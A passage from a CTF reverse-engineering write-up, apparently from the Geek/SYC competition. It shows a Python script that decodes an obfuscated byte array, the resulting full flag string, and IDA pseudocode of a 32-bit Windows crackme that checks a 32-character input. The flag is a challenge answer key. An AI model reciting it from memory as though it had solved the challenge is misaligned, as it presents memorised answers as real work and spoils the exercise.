</span></span><span class="line"><span class="cl"><span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">65</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">42</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">87</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">47</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">84</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">62</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">87</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">65</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">87</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">80</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">86</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">87</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">88</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">119</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">86</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="mi">137</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">85</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">183</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-10">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{Alright_I_sti1l_h0pe_th3t_you_solved_the_chall3nge_by_deobfuscating_them_Geek_is_just_the_first_step_of_your_CTF_journey_Im_glad_I_could_be_part_of_your_growth_Good_luck_for_y0u!}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="lastone">Lastone
</h3><h4 id="解题流程-17">解题流程
</h4><p>看看伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">FILE</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp-8h] [ebp-150h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-148h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-148h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-148h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-138h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+DCh] [ebp-6Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v13</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [esp+E8h] [ebp-60h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v14</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="c1">// [esp+EBh] [ebp-5Dh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v15</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [esp+F6h] [ebp-52h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v16</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [esp+106h] [ebp-42h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">Buffer</span><span class="p">[</span><span class="mi">44</span><span class="p">];</span> <span class="c1">// [esp+110h] [ebp-38h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">BOOL</span> <span class="n">Wow64Process</span><span class="p">;</span> <span class="c1">// [esp+13Ch] [ebp-Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">savedregs</span><span class="p">;</span> <span class="c1">// [esp+148h] [ebp+0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_AE125D</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_AEE0A3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">Wow64Process</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">GetCurrentProcess</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">sub_AE1186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">IsWow64Process</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Wow64Process</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">sub_AE1186</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">Wow64Process</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;[+] Input your flag: &#34;</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__acrt_iob_func</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="nf">sub_AE1186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">sub_AE1186</span><span class="p">()</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">strcspn</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="nf">sub_AE1186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v11</span> <span class="o">&gt;=</span> <span class="mh">0x21</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_AE1032</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">Buffer</span><span class="p">[</span><span class="n">v11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Buffer</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">Encode</span><span class="p">(</span><span class="n">Buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v13</span><span class="p">,</span> <span class="s">&#34;5g&#34;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v13</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v14</span><span class="p">,</span> <span class="s">&#34;-t@S1AobEK&#34;</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v14</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">31</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v15</span><span class="p">,</span> <span class="s">&#34;W6_KsnOl_I]&#34;</span><span class="p">,</span> <span class="mi">11</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">63</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">121</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">46</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">qmemcpy</span><span class="p">(</span><span class="n">v16</span><span class="p">,</span> <span class="s">&#34;i~&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">v13</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">Buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">LABEL_16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;Yes,Yes.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;This is my love.</span><span class="se">\n</span><span class="s">I LOVE YOU.</span><span class="se">\n</span><span class="s">Thanks!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;[!] Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;[!] Wrong!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;[!] Must run in 32-bit on 64-bit Windows</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_16</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_AE113B</span><span class="p">(</span><span class="o">&amp;</span><span class="n">savedregs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dword_AE3CCC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// attributes: thunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">Encode</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">sub_AE2330</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__cdecl</span> <span class="nf">sub_AE2330</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp-8h] [ebp-CC0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-CB8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+3E8h] [ebp-8D0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [esp+3F4h] [ebp-8C4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [esp+400h] [ebp-8B8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [esp+40Ch] [ebp-8ACh]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [esp+418h] [ebp-8A0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+424h] [ebp-894h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">lpAddress</span><span class="p">;</span> <span class="c1">// [esp+458h] [ebp-860h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [esp+464h] [ebp-854h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [esp+468h] [ebp-850h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [esp+46Ch] [ebp-84Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [esp+470h] [ebp-848h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">savedregs</span><span class="p">;</span> <span class="c1">// [esp+CB8h] [ebp+0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
